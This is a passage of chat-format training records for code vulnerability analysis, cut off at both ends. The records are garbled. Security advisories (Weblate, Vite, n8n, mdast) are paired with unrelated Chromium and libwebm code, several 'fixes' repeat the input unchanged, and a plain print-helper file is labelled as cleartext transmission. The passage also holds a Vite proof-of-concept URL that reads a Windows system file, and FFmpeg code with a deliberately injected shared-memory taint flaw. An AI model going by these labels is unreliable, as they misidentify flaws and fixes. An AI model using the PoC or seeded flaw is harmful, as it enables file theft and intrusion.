example:\n\n```js\nlet input = \"...\"\n\ninput = input\n    .replace(/&/g, \"&amp;\")\n    .replace(/</g, \"&lt;\")\n    .replace(/>/g, \"&gt;\")\n    .replace(/\"/g, \"&quot;\")\n    .replace(/'/g, \"&apos;\")\n\ndoc.addMetadata(input)\n```\nFIX:\naspath_empty (void)\n{\n  return aspath_parse (NULL, 0, 1); /* 32Bit ;-) */\n}\n"}]}
{"messages": [{"role": "user", "content": "analyze this code for security violations:\n\n/* TEMPLATE GENERATED TESTCASE FILE\nFilename: CWE190_Integer_Overflow__unsigned_int_rand_preinc_65b.c\nLabel Definition File: CWE190_Integer_Overflow.label.xml\nTemplate File: sources-sinks-65b.tmpl.c\n*/\n/*\n * @description\n * CWE: 190 Integer Overflow\n * BadSource: rand Set data to result of rand()\n * GoodSource: Set data to a small, non-zero number (two)\n * Sinks: increment\n *    GoodSink: Ensure there will not be an overflow before incrementing data\n *    BadSink : Increment data, which can cause an overflow\n * Flow Variant: 65 Data/control flow: data passed as an argument from one function to a function in a different source file called via a function pointer\n *\n * */\n\n#include \"std_testcase.h\"\n\n#ifndef OMITBAD\n\nvoid CWE190_Integer_Overflow__unsigned_int_rand_preinc_65b_badSink(unsigned int data)\n{\n    {\n        /* POTENTIAL FLAW: Incrementing data could cause an overflow */\n        ++data;\n        unsigned int result = data;\n        printUnsignedLine(result);\n    }\n}\n\n#endif /* OMITBAD */\n\n#ifndef OMITGOOD\n\n/* goodG2B uses the GoodSource with the BadSink */\nvoid CWE190_Integer_Overflow__unsigned_int_rand_preinc_65b_goodG2BSink(unsigned int data)\n{\n    {\n        /* POTENTIAL FLAW: Incrementing data could cause an overflow */\n        ++data;\n        unsigned int result = data;\n        printUnsignedLine(result);\n    }\n}\n\n/* goodB2G uses the BadSource with the GoodSink */\nvoid CWE190_Integer_Overflow__unsigned_int_rand_preinc_65b_goodB2GSink(unsigned int data)\n{\n    /* FIX: Add a check to prevent an overflow from occurring */\n    if (data < UINT_MAX)\n    {\n        ++data;\n        unsigned int result = data;\n        printUnsignedLine(result);\n    }\n    else\n    {\n        printLine(\"data value is too large to perform arithmetic safely.\");\n    }\n}\n\n#endif /* OMITGOOD */\n"}, {"role": "assistant", "content": "{\n  \"violation_type\": \"integer_overflow\",\n  \"severity\": \"high\",\n  \"explanation\": \"This code performs arithmetic operations that can exceed the maximum size of the data type. This can lead to unexpected behavior, crashes, or security vulnerabilities.\",\n  \"risk\": \"Memory corruption, arbitrary code execution, denial of service, security bypass\",\n  \"compliant_patch\": \"\\n// FIXED: Add bounds checking before arithmetic operations\\n// Instead of: result = a + b;\\n// Use: if (b > INT_MAX - a) { handle_error(); }\\n//       result = a + b;\\n\\n// Or use safe arithmetic functions:\\n// if (!safe_add(a, b, &result)) { handle_error(); }\\n\",\n  \"source\": \"SARD-237279\",\n  \"cwe\": \"CWE-190\"\n}"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Weblate is vulnerable to RCE through Git config file overwrite:\n\nvoid VirtualAuthenticator::AddRegistration(\n    blink::test::mojom::RegisteredKeyPtr registration,\n    AddRegistrationCallback callback) {\n  if (registration->application_parameter.size() != device::kRpIdHashLength) {\n    std::move(callback).Run(false);\n    return;\n  }\n\n  bool success = false;\n  std::tie(std::ignore, success) = state_->registrations.emplace(\n      std::move(registration->key_handle),\n       ::device::VirtualFidoDevice::RegistrationData(\n           crypto::ECPrivateKey::CreateFromPrivateKeyInfo(\n               registration->private_key),\n          registration->application_parameter, registration->counter));\n   std::move(callback).Run(success);\n }\n"}, {"role": "assistant", "content": "VIOLATION: CWE-22\nREASON: ### Impact\n\nIt was possible to overwrite Git configuration remotely and override some of its behavior.\n\n\n### Resources\n\nThanks to Jason Marcello for responsible disclosure.\nFIX:\nvoid VirtualAuthenticator::AddRegistration(\n    blink::test::mojom::RegisteredKeyPtr registration,\n    AddRegistrationCallback callback) {\n  if (registration->application_parameter.size() != device::kRpIdHashLength) {\n    std::move(callback).Run(false);\n    return;\n  }\n\n  bool success = false;\n  std::tie(std::ignore, success) = state_->registrations.emplace(\n      std::move(registration->key_handle),\n       ::device::VirtualFidoDevice::RegistrationData(\n           crypto::ECPrivateKey::CreateFromPrivateKeyInfo(\n               registration->private_key),\n          base::make_span<device::kRpIdHashLength>(\n              registration->application_parameter),\n          registration->counter));\n   std::move(callback).Run(success);\n }\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for mdast-util-to-hast has unsanitized class attribute:\n\nconst Cluster* BlockEntry::GetCluster() const { return m_pCluster; }\n"}, {"role": "assistant", "content": "VIOLATION: CWE-20\nREASON: ### Impact\n\nMultiple (unprefixed) classnames could be added in markdown source by using character references.\nThis could make rendered user supplied markdown `code` elements appear like the rest of the page.\nThe following markdown:\n\n````markdown\n```js&#x20;xss\n```\n````\n\nWould create `<pre><code class=\"language-js xss\"></code></pre>`\nIf your page then applied `.xss` classes (or listeners in JS), those apply to this element.\nFor more info see <https://github.com/ChALkeR/notes/blob/master/Improper-markup-sanitization.md#unsanitized-class-attribute>\n\n### Patches\n\nThe bug was patched. When using regular semver, run `npm install`. For exact ranges, make sure to use `13.2.1`.\n\n### Workarounds\n\nUpdate.\n\n### References\n\n* bug introduced in https://github.com/syntax-tree/mdast-util-to-hast/commit/6fc783ae6abdeb798fd5a68e7f3f21411dde7403\n* bug fixed in https://github.com/syntax-tree/mdast-util-to-hast/commit/ab3a79570a1afbfa7efef5d4a0cd9b5caafbc5d7\nFIX:\nconst Cluster* BlockEntry::GetCluster() const { return m_pCluster; }\n"}]}
{"messages": [{"role": "user", "content": "analyze this code for security violations:\n\n#include <inttypes.h> // for PRId64\n#include <stdio.h>\n#include <stdlib.h>\n#include <wctype.h>\n#include \"std_testcase.h\"\n\n#ifndef _WIN32\n#include <wchar.h>\n#endif\n\nvoid printLine (const char * line)\n{\n    if(line != NULL) \n    {\n        printf(\"%s\\n\", line);\n    }\n}\n\nvoid printWLine (const wchar_t * line)\n{\n    if(line != NULL) \n    {\n        wprintf(L\"%ls\\n\", line);\n    }\n}\n\nvoid printIntLine (int intNumber)\n{\n    printf(\"%d\\n\", intNumber);\n}\n\nvoid printShortLine (short shortNumber)\n{\n    printf(\"%hd\\n\", shortNumber);\n}\n\nvoid printFloatLine (float floatNumber)\n{\n    printf(\"%f\\n\", floatNumber);\n}\n\nvoid printLongLine (long longNumber)\n{\n    printf(\"%ld\\n\", longNumber);\n}\n\nvoid printLongLongLine (int64_t longLongIntNumber)\n{\n    printf(\"%\" PRId64 \"\\n\", longLongIntNumber);\n}\n\nvoid printSizeTLine (size_t sizeTNumber)\n{\n    printf(\"%zu\\n\", sizeTNumber);\n}\n\nvoid printHexCharLine (char charHex)\n{\n    printf(\"%02x\\n\", charHex);\n}\n\nvoid printWcharLine(wchar_t wideChar) \n{\n    /* ISO standard dictates wchar_t can be ref'd only with %ls, so we must make a\n     * string to print a wchar */\n    wchar_t s[2];\n        s[0] = wideChar;\n        s[1] = L'\\0';\n    printf(\"%ls\\n\", s);\n}\n\nvoid printUnsignedLine(unsigned unsignedNumber) \n{\n    printf(\"%u\\n\", unsignedNumber);\n}\n\nvoid printHexUnsignedCharLine(unsigned char unsignedCharacter) \n{\n    printf(\"%02x\\n\", unsignedCharacter);\n}\n\nvoid printDoubleLine(double doubleNumber) \n{\n    printf(\"%g\\n\", doubleNumber);\n}\n\nvoid printStructLine (const twoIntsStruct * structTwoIntsStruct)\n{\n    printf(\"%d -- %d\\n\", structTwoIntsStruct->intOne, structTwoIntsStruct->intTwo);\n}\n\nvoid printBytesLine(const unsigned char * bytes, size_t numBytes)\n{\n    size_t i;\n    for (i = 0; i < numBytes; ++i)\n    {\n        printf(\"%02x\", bytes[i]);\n    }\n    puts(\"\");\t/* output newline */\n}\n\n/* Decode a string of hex characters into the bytes they represent.  The second\n * parameter specifies the length of the output buffer.  The number of bytes\n * actually written to the output buffer is returned. */\nsize_t decodeHexChars(unsigned char * bytes, size_t numBytes, const char * hex)\n{\n    size_t numWritten = 0;\n\n    /* We can't sscanf directly into the byte array since %02x expects a pointer to int,\n     * not a pointer to unsigned char.  Also, since we expect an unbroken string of hex\n     * characters, we check for that before calling sscanf; otherwise we would get a\n     * framing error if there's whitespace in the input string. */\n    while (numWritten < numBytes && isxdigit(hex[2 * numWritten]) && isxdigit(hex[2 * numWritten + 1]))\n    {\n        int byte;\n        sscanf(&hex[2 * numWritten], \"%02x\", &byte);\n        bytes[numWritten] = (unsigned char) byte;\n        ++numWritten;\n    }\n\n    return numWritten;\n}\n\n/* Decode a string of hex characters into the bytes they represent.  The second\n * parameter specifies the length of the output buffer.  The number of bytes\n * actually written to the output buffer is returned. */\n size_t decodeHexWChars(unsigned char * bytes, size_t numBytes, const wchar_t * hex)\n {\n    size_t numWritten = 0;\n\n    /* We can't swscanf directly into the byte array since %02x expects a pointer to int,\n     * not a pointer to unsigned char.  Also, since we expect an unbroken string of hex\n     * characters, we check for that before calling swscanf; otherwise we would get a\n     * framing error if there's whitespace in the input string. */\n    while (numWritten < numBytes && iswxdigit(hex[2 * numWritten]) && iswxdigit(hex[2 * numWritten + 1]))\n    {\n        int byte;\n        swscanf(&hex[2 * numWritten], L\"%02x\", &byte);\n        bytes[numWritten] = (unsigned char) byte;\n        ++numWritten;\n    }\n\n    return numWritten;\n}\n\n/* The two functions always return 1 or 0, so a tool should be able to \n   identify that uses of these functions will always return these values */\nint globalReturnsTrue() \n{\n    return 1;\n}\n\nint globalReturnsFalse() \n{\n    return 0;\n}\n\nint globalReturnsTrueOrFalse() \n{\n    return (rand() % 2);\n}\n\n/* The variables below are declared \"const\", so a tool should\n   be able to identify that reads of these will always return their \n   initialized values. */\nconst int GLOBAL_CONST_TRUE = 1; /* true */\nconst int GLOBAL_CONST_FALSE = 0; /* false */\nconst int GLOBAL_CONST_FIVE = 5; \n\n/* The variables below are not defined as \"const\", but are never\n   assigned any other value, so a tool should be able to identify that\n   reads of these will always return their initialized values. */\nint globalTrue = 1; /* true */\nint globalFalse = 0; /* false */\nint globalFive = 5; \n\n/* define a bunch of these as empty functions so that if a test case forgets\n   to make their's statically scoped, we'll get a linker error */\nvoid good1() { }\nvoid good2() { }\nvoid good3() { }\nvoid good4() { }\nvoid good5() { }\nvoid good6() { }\nvoid good7() { }\nvoid good8() { }\nvoid good9() { }\n\n/* shouldn't be used, but just in case */\nvoid bad1() { }\nvoid bad2() { }\nvoid bad3() { }\nvoid bad4() { }\nvoid bad5() { }\nvoid bad6() { }\nvoid bad7() { }\nvoid bad8() { }\nvoid bad9() { }\n\n/* define global argc and argv */\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\nint globalArgc = 0;\nchar** globalArgv = NULL;\n\n#ifdef __cplusplus\n}\n#endif\n"}, {"role": "assistant", "content": "{\n  \"violation_type\": \"cleartext_transmission\",\n  \"severity\": \"high\",\n  \"explanation\": \"This code transmits sensitive information without encryption. Attackers can intercept and read confidential data sent over the network.\",\n  \"risk\": \"Data interception, credential theft, privacy violations, compliance violations\",\n  \"compliant_patch\": \"\\n// FIXED: Use encryption for sensitive data transmission\\n// Instead of: send_data_in_cleartext(data);\\n// Use: encrypted_data = encrypt_data(data, encryption_key);\\n//       send_encrypted_data(encrypted_data);\\n\\n// Use TLS/SSL for network communication\\n// Ensure all connections use HTTPS/SSL/TLS\\n\",\n  \"source\": \"SARD-94281\",\n  \"cwe\": \"CWE-319\"\n}"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Vite has a `server.fs.deny` bypassed for `inline` and `raw` with `?import` query:\n\n    void CallCallback(UsageAndQuotaCallback callback) {\n      std::move(callback).Run(blink::mojom::QuotaStatusCode::kOk, 0,\n                              kMockQuota);\n    }\n"}, {"role": "assistant", "content": "VIOLATION: CWE-200\nREASON: ### Summary\n\nThe contents of arbitrary files can be returned to the browser.\n\n### Impact\nOnly apps explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\n\n### Details\n\n- base64 encoded content of non-allowed files is exposed using `?inline&import` (originally reported as `?import&?inline=1.wasm?init`)\n- content of non-allowed files is exposed using `?raw?import`\n\n`/@fs/` isn't needed to reproduce the issue for files inside the project root.\n\n### PoC\n\nOriginal report (check details above for simplified cases):\n\nThe ?import&?inline=1.wasm?init ending allows attackers to read arbitrary files and returns the file content if it exists.  Base64 decoding needs to be performed twice\n```\n$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\n```\n\nExample full URL `http://localhost:5173/@fs/C:/windows/win.ini?import&?inline=1.wasm?init`\nFIX:\n    void CallCallback(UsageAndQuotaCallback callback) {\n      std::move(callback).Run(blink::mojom::QuotaStatusCode::kOk, 0,\n                              kMockQuota);\n    }\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for n8n's Unsafe Buffer Allocation Allows In-Process Memory Disclosure in Task Runner:\n\nvoid DevToolsWindow::DoAction(const DevToolsToggleAction& action) {\n  switch (action.type()) {\n    case DevToolsToggleAction::kInspect:\n      bindings_->CallClientFunction(\"DevToolsAPI.enterInspectElementMode\", NULL,\n                                    NULL, NULL);\n      break;\n\n    case DevToolsToggleAction::kShowElementsPanel:\n    case DevToolsToggleAction::kShowConsolePanel:\n    case DevToolsToggleAction::kShow:\n    case DevToolsToggleAction::kToggle:\n      break;\n\n    case DevToolsToggleAction::kReveal: {\n      const DevToolsToggleAction::RevealParams* params =\n          action.params();\n      CHECK(params);\n      base::Value url_value(params->url);\n      base::Value line_value(static_cast<int>(params->line_number));\n      base::Value column_value(static_cast<int>(params->column_number));\n      bindings_->CallClientFunction(\"DevToolsAPI.revealSourceLine\",\n                                    &url_value, &line_value, &column_value);\n      break;\n    }\n    default:\n      NOTREACHED();\n      break;\n  }\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-668\nREASON: ### Impact\n\nThe use of `Buffer.allocUnsafe()` and `Buffer.allocUnsafeSlow()` in the task runner allowed untrusted code to allocate uninitialized memory. Such uninitialized buffers could contain residual data from within the same Node.js process (for example, data from prior requests, tasks, secrets, or tokens), resulting in potential information disclosure.  \n\nOnly authenticated users are able to execute code through Task Runners.\n\nThis issue affected any deployment in which both of the following conditions were met:\n- Task Runners were enabled using `N8N_RUNNERS_ENABLED=true` (default: false)\n- Code Node was enabled (default: true)\n\n\n### Patches\n\nAccess to unsafe Buffer functions has been removed from the task runner sandbox. All buffer allocations are now zero-filled by default.\n\n- **Fixed in:** 1.114.3 & 1.115.0\n- **Action:** It is strongly recommended to upgrade to version \u2265 1.114.3 as soon as possible.\n\nChanges introduced in this patch include:\n- Routing all buffer allocations through `Buffer.alloc` (which zero-fills) operations where applicable  \n- Adding regression tests to ensure continued enforcement of safe allocation practices\n\n\n### Workarounds\n\nIf an immediate upgrade cannot be applied, the following hardening steps are recommended:\n\n- Disable the Code Node by adding `n8n-nodes-base.code` to the `NODES_EXCLUDE` environment variable  \n- Prefer external mode for isolation: run Task Runners in external mode so that untrusted task code executes in a separate sidecar container rather than within the main n8n process. This configuration significantly reduces the risk of in-process memory disclosure caused by unsafe buffer allocations.  \n  In external mode, a launcher manages Task Runner processes in a dedicated sidecar environment, separate from the primary n8n instance.  \n  See the [n8n documentation](https://docs.n8n.io/hosting/configuration/task-runners/) for configuration details and required environment variables.\n\n\n### Resources\n\n- Node.js documentation: [`Buffer.alloc()`](https://nodejs.org/docs/latest-v22.x/api/buffer.html#static-method-bufferallocsize-fill-encoding) vs [`Buffer.allocUnsafe()`](https://nodejs.org/docs/latest-v22.x/api/buffer.html#static-method-bufferallocunsafesize) \u2014 background on zero-filled vs uninitialized allocations  \n- [n8n Documentation \u2014 Task Runners](https://docs.n8n.io/hosting/configuration/task-runners/) \u2014 external mode, setup guide, and environment configuration details\n- [n8n Documentation \u2014 Blocking nodes](https://docs.n8n.io/hosting/securing/blocking-nodes/) \u2014 how to globally disable specific nodes\nFIX:\nvoid DevToolsWindow::DoAction(const DevToolsToggleAction& action) {\n  switch (action.type()) {\n    case DevToolsToggleAction::kInspect:\n      bindings_->CallClientFunction(\"DevToolsAPI.enterInspectElementMode\", NULL,\n                                    NULL, NULL);\n      break;\n\n    case DevToolsToggleAction::kShowElementsPanel:\n    case DevToolsToggleAction::kShowConsolePanel:\n    case DevToolsToggleAction::kShow:\n    case DevToolsToggleAction::kToggle:\n      break;\n\n    case DevToolsToggleAction::kReveal: {\n      const DevToolsToggleAction::RevealParams* params =\n          action.params();\n      CHECK(params);\n      base::Value url_value(params->url);\n      base::Value line_value(static_cast<int>(params->line_number));\n      base::Value column_value(static_cast<int>(params->column_number));\n      bindings_->CallClientFunction(\"DevToolsAPI.revealSourceLine\",\n                                    &url_value, &line_value, &column_value);\n      break;\n    }\n    default:\n      NOTREACHED();\n      break;\n  }\n}\n"}]}
{"messages": [{"role": "user", "content": "analyze this code for security violations:\n\n/*\n * AVPacket functions for libavcodec\n * Copyright (c) 2000, 2001, 2002 Fabrice Bellard\n *\n * This file is part of FFmpeg.\n *\n * FFmpeg is free software; you can redistribute it and/or\n * modify it under the terms of the GNU Lesser General Public\n * License as published by the Free Software Foundation; either\n * version 2.1 of the License, or (at your option) any later version.\n *\n * FFmpeg is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public\n * License along with FFmpeg; if not, write to the Free Software\n * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA\n */\n#include <string.h>\n#include \"libavutil/avassert.h\"\n#include \"libavutil/mem.h\"\n#include \"avcodec.h\"\n#include \"bytestream.h\"\n#include \"internal.h\"\n#include <sys/stat.h> \n#include <sys/ipc.h> \n#include <sys/shm.h> \n#include <sys/types.h> \n#include <mysql.h> \n#include <stonesoup/stonesoup_trace.h> \nint desktops_sesquinona = 0;\nint stonesoup_global_variable;\nvoid* stonesoup_printf_context = NULL;\nvoid stonesoup_setup_printf_context() {\n    struct stat st = {0};\n    char * ss_tc_root = NULL;\n    char * dirpath = NULL;\n    int size_dirpath = 0;\n    char * filepath = NULL;\n    int size_filepath = 0;\n    int retval = 0;\n    ss_tc_root = getenv(\"SS_TC_ROOT\");\n    if (ss_tc_root != NULL) {\n        size_dirpath = strlen(ss_tc_root) + strlen(\"testData\") + 2;\n        dirpath = (char*) malloc (size_dirpath * sizeof(char));\n        if (dirpath != NULL) {\n            sprintf(dirpath, \"%s/%s\", ss_tc_root, \"testData\");\n            retval = 0;\n            if (stat(dirpath, &st) == -1) {\n                retval = mkdir(dirpath, 0700);\n            }\n            if (retval == 0) {\n                size_filepath = strlen(dirpath) + strlen(\"logfile.txt\") + 2;\n                filepath = (char*) malloc (size_filepath * sizeof(char));\n                if (filepath != NULL) {\n                    sprintf(filepath, \"%s/%s\", dirpath, \"logfile.txt\");\n                    stonesoup_printf_context = fopen(filepath, \"w\");\n                    free(filepath);\n                }\n            }\n            free(dirpath);\n        }\n    }\n    if (stonesoup_printf_context == NULL) {\n        stonesoup_printf_context = stderr;\n    }\n}\nvoid stonesoup_printf(char * format, ...) {\n    va_list argptr;\n    va_start(argptr, format);\n    vfprintf(stonesoup_printf_context, format, argptr);\n    va_end(argptr);\n    fflush(stonesoup_printf_context);\n}\nvoid stonesoup_close_printf_context() {\n    if (stonesoup_printf_context != NULL &&\n        stonesoup_printf_context != stderr) {\n        fclose(stonesoup_printf_context);\n    }\n}\nvoid stonesoup_read_taint(char** stonesoup_tainted_buff, char* stonesoup_envKey, int stonesoup_shmsz) {\n    int stonesoup_shmid;\n key_t stonesoup_key;\n char *stonesoup_shm, *stonesoup_s;\n char* stonesoup_envSize = NULL;\n *stonesoup_tainted_buff = NULL;\n    if (getenv(\"STONESOUP_DISABLE_WEAKNESS\") == NULL ||\n        strcmp(getenv(\"STONESOUP_DISABLE_WEAKNESS\"), \"1\") != 0) {\n        if(stonesoup_envKey != NULL) {\n            if(sscanf(stonesoup_envKey, \"%d\", &stonesoup_key) > 0) {\n                if ((stonesoup_shmid = shmget(stonesoup_key, stonesoup_shmsz, 0666)) >= 0) {\n                    if ((stonesoup_shm = shmat(stonesoup_shmid, NULL, 0)) != (char *) -1) {\n                        *stonesoup_tainted_buff = (char*)calloc(stonesoup_shmsz, sizeof(char));\n                        /* STONESOUP: SOURCE-TAINT (Shared Memory) */\n                        for (stonesoup_s = stonesoup_shm; *stonesoup_s != (char)0; stonesoup_s++) {\n                            (*stonesoup_tainted_buff)[stonesoup_s - stonesoup_shm] = *stonesoup_s;\n                        }\n                    }\n                }\n            }\n        }\n    } else {\n        *stonesoup_tainted_buff = NULL;\n    }\n}\nvoid chocho_cumbrance(char *const islanded_lyburn);\n\nvoid ff_packet_free_side_data(AVPacket *pkt)\n{\n  int i;\n  for (i = 0; i < pkt -> side_data_elems; i++) \n    av_free(pkt -> side_data[i] . data);\n  av_freep((&pkt -> side_data));\n  pkt -> side_data_elems = 0;\n}\n\nvoid av_destruct_packet(AVPacket *pkt)\n{\n  av_free((pkt -> data));\n  pkt -> data = ((void *)0);\n  pkt -> size = 0;\n}\n\nvoid av_init_packet(AVPacket *pkt)\n{\n  pkt -> pts = ((int64_t )0x8000000000000000UL);\n  pkt -> dts = ((int64_t )0x8000000000000000UL);\n  pkt -> pos = (- 1);\n  pkt -> duration = 0;\n  pkt -> convergence_duration = 0;\n  pkt -> flags = 0;\n  pkt -> stream_index = 0;\n  pkt -> destruct = ((void *)0);\n  pkt -> side_data = ((void *)0);\n  pkt -> side_data_elems = 0;\n}\n\nint av_new_packet(AVPacket *pkt,int size)\n{\n  uint8_t *data = ((void *)0);\n  if (((unsigned int )size) < ((unsigned int )size) + 16) {\n    data = (av_malloc((size + 16)));\n  }\n  if (data) {\n    memset((data + size),0,16);\n  }\n  else {\n    size = 0;\n  }\n  av_init_packet(pkt);\n  pkt -> data = data;\n  pkt -> size = size;\n  pkt -> destruct = av_destruct_packet;\n  if (!data) {\n    return - 12;\n  }\n  return 0;\n}\n\nvoid av_shrink_packet(AVPacket *pkt,int size)\n{\n  if (pkt -> size <= size) {\n    return ;\n  }\n  pkt -> size = size;\n  memset((pkt -> data + size),0,16);\n}\n\nint av_grow_packet(AVPacket *pkt,int grow_by)\n{\n  void *new_ptr;\n  do {\n    if (!(((unsigned int )(pkt -> size)) <= (2147483647 - 16))) {\n      av_log(((void *)0),0,\"Assertion %s failed at %s:%d\\n\",\"(unsigned)pkt->size <= 2147483647 - 16\",\"avpacket.c\",90);\n      abort();\n    }\n  }while (0);\n  if (!pkt -> size) {\n    return av_new_packet(pkt,grow_by);\n  }\n  if (((unsigned int )grow_by) > (2147483647 - (pkt -> size + 16))) {\n    return - 1;\n  }\n  new_ptr = av_realloc((pkt -> data),(pkt -> size + grow_by + 16));\n  if (!new_ptr) {\n    return - 12;\n  }\n  pkt -> data = new_ptr;\n  pkt -> size += grow_by;\n  memset((pkt -> data + pkt -> size),0,16);\n  return 0;\n}\n#define DUP_DATA(dst, src, size, padding)                               \\\n    do {                                                                \\\n        void *data;                                                     \\\n        if (padding) {                                                  \\\n            if ((unsigned)(size) >                                      \\\n                (unsigned)(size) + FF_INPUT_BUFFER_PADDING_SIZE)        \\\n                goto failed_alloc;                                      \\\n            data = av_malloc(size + FF_INPUT_BUFFER_PADDING_SIZE);      \\\n        } else {                                                        \\\n            data = av_malloc(size);                                     \\\n        }                                                               \\\n        if (!data)                                                      \\\n            goto failed_alloc;                                          \\\n        memcpy(data, src, size);                                        \\\n        if (padding)                                                    \\\n            memset((uint8_t *)data + size, 0,                           \\\n                   FF_INPUT_BUFFER_PADDING_SIZE);                       \\\n        dst = data;                                                     \\\n    } while (0)\n/* Makes duplicates of data, side_data, but does not copy any other fields */\n\nstatic int copy_packet_data(AVPacket *dst,AVPacket *src)\n{\n  dst -> data = ((void *)0);\n  dst -> side_data = ((void *)0);\n  do {\n    void *data;\n    if (1) {\n      if (((unsigned int )(dst -> size)) > ((unsigned int )(dst -> size)) + 16) {\n        goto failed_alloc;\n      }\n      data = av_malloc((dst -> size + 16));\n    }\n    else {\n      data = av_malloc((dst -> size));\n    }\n    if (!data) {\n      goto failed_alloc;\n    }\n    memcpy(data,(src -> data),(dst -> size));\n    if (1) {\n      memset((((uint8_t *)data) + dst -> size),0,16);\n    }\n    dst -> data = data;\n  }while (0);\n  dst -> destruct = av_destruct_packet;\n  if (dst -> side_data_elems) {\n    int i;\n    do {\n      void *data;\n      if (0) {\n        if (((unsigned int )((dst -> side_data_elems) * sizeof(( *dst -> side_data)))) > ((unsigned int )((dst -> side_data_elems) * sizeof(( *dst -> side_data)))) + 16) {\n          goto failed_alloc;\n        }\n        data = av_malloc((dst -> side_data_elems) * sizeof(( *dst -> side_data)) + 16);\n      }\n      else {\n        data = av_malloc((dst -> side_data_elems) * sizeof(( *dst -> side_data)));\n      }\n      if (!data) {\n        goto failed_alloc;\n      }\n      memcpy(data,(src -> side_data),(dst -> side_data_elems) * sizeof(( *dst -> side_data)));\n      if (0) {\n        memset((((uint8_t *)data) + (dst -> side_data_elems) * sizeof(( *dst -> side_data))),0,16);\n      }\n      dst -> side_data = data;\n    }while (0);\n    memset((dst -> side_data),0,(dst -> side_data_elems) * sizeof(( *dst -> side_data)));\n    for (i = 0; i < dst -> side_data_elems; i++) {\n      do {\n        void *data;\n        if (1) {\n          if (((unsigned int )src -> side_data[i] . size) > ((unsigned int )src -> side_data[i] . size) + 16) {\n            goto failed_alloc;\n          }\n          data = av_malloc((src -> side_data[i] . size + 16));\n        }\n        else {\n          data = av_malloc(src -> side_data[i] . size);\n        }\n        if (!data) {\n          goto failed_alloc;\n        }\n        memcpy(data,src -> side_data[i] . data,src -> side_data[i] . size);\n        if (1) {\n          memset((((uint8_t *)data) + src -> side_data[i] . size),0,16);\n        }\n        dst -> side_data[i] . data = data;\n      }while (0);\n      dst -> side_data[i] . size = src -> side_data[i] . size;\n      dst -> side_data[i] . type = src -> side_data[i] . type;\n    }\n  }\n  return 0;\n  failed_alloc:\n  av_destruct_packet(dst);\n  return - 12;\n}\n\nint av_dup_packet(AVPacket *pkt)\n{\n  AVPacket tmp_pkt;\n  if (pkt -> destruct == ((void *)0) && pkt -> data) {\n    tmp_pkt =  *pkt;\n    return copy_packet_data(pkt,&tmp_pkt);\n  }\n  return 0;\n}\n\nint av_copy_packet(AVPacket *dst,AVPacket *src)\n{\n   *dst =  *src;\n  return copy_packet_data(dst,src);\n}\n\nvoid av_free_packet(AVPacket *pkt)\n{\n  if (pkt) {\n    int i;\n    if (pkt -> destruct) {\n      (pkt -> destruct)(pkt);\n    }\n    pkt -> data = ((void *)0);\n    pkt -> size = 0;\n    for (i = 0; i < pkt -> side_data_elems; i++) \n      av_free(pkt -> side_data[i] . data);\n    av_freep((&pkt -> side_data));\n    pkt -> side_data_elems = 0;\n  }\n}\n\nuint8_t *av_packet_new_side_data(AVPacket *pkt,enum AVPacketSideDataType type,int size)\n{\n  int elems = pkt -> side_data_elems;\n  if ((((unsigned int )elems) + 1) > 2147483647 / sizeof(( *pkt -> side_data))) {\n    return ((void *)0);\n  }\n  if (((unsigned int )size) > (2147483647 - 16)) {\n    return ((void *)0);\n  }\n  pkt -> side_data = (av_realloc((pkt -> side_data),(elems + 1) * sizeof(( *pkt -> side_data))));\n  if (!pkt -> side_data) {\n    return ((void *)0);\n  }\n  pkt -> side_data[elems] . data = (av_malloc((size + 16)));\n  if (!pkt -> side_data[elems] . data) {\n    return ((void *)0);\n  }\n  pkt -> side_data[elems] . size = size;\n  pkt -> side_data[elems] . type = type;\n  pkt -> side_data_elems++;\n  return pkt -> side_data[elems] . data;\n}\n\nuint8_t *av_packet_get_side_data(AVPacket *pkt,enum AVPacketSideDataType type,int *size)\n{\n  int i;\n  for (i = 0; i < pkt -> side_data_elems; i++) {\n    if (pkt -> side_data[i] . type == type) {\n      if (size) {\n         *size = pkt -> side_data[i] . size;\n      }\n      return pkt -> side_data[i] . data;\n    }\n  }\n  return ((void *)0);\n}\n#define FF_MERGE_MARKER 0x8c4d9d108e25e9feULL\n\nint av_packet_merge_side_data(AVPacket *pkt)\n{\n  if (pkt -> side_data_elems) {\n    int i;\n    uint8_t *p;\n    uint64_t size = ((pkt -> size) + 8LL + 16);\n    AVPacket old =  *pkt;\n    for (i = 0; i < old . side_data_elems; i++) {\n      size += (old . side_data[i] . size + 5);\n    }\n    if (size > 2147483647) {\n      return - 22;\n    }\n    p = (av_malloc(size));\n    if (!p) {\n      return - 12;\n    }\n    pkt -> data = p;\n    pkt -> destruct = av_destruct_packet;\n    pkt -> size = (size - 16);\n    bytestream_put_buffer(&p,old . data,old . size);\n    for (i = old . side_data_elems - 1; i >= 0; i--) {\n      bytestream_put_buffer(&p,old . side_data[i] . data,old . side_data[i] . size);\n      bytestream_put_be32(&p,old . side_data[i] . size);\n       *(p++) = (old . side_data[i] . type | ((i == old . side_data_elems - 1) * 128));\n    }\n    bytestream_put_be64(&p,0x8c4d9d108e25e9feULL);\n    do {\n      if (!(p - pkt -> data == (pkt -> size))) {\n        av_log(((void *)0),0,\"Assertion %s failed at %s:%d\\n\",\"p-pkt->data == pkt->size\",\"avpacket.c\",255);\n        abort();\n      }\n    }while (0);\n    memset(p,0,16);\n    av_free_packet(&old);\n    pkt -> side_data_elems = 0;\n    pkt -> side_data = ((void *)0);\n    return 1;\n  }\n  return 